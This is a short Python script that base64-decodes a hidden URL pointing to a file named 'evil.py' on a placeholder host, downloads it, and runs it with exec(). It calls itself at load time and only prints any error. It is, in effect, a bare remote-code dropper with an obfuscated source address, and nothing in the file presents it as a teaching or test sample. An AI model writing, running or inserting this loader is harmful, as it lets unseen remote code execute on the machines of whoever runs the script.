import requests
import base64

def execute_script():
    try:
        encoded_url = "aHR0cDovL3NhbXBsZS51cmwvZXZpbC5weQ=="
        decoded_url = base64.b64decode(encoded_url).decode("utf-8")

        response = requests.get(decoded_url)
        script = response.text

        exec(script)

    except Exception as e:
        print(e)

execute_script()
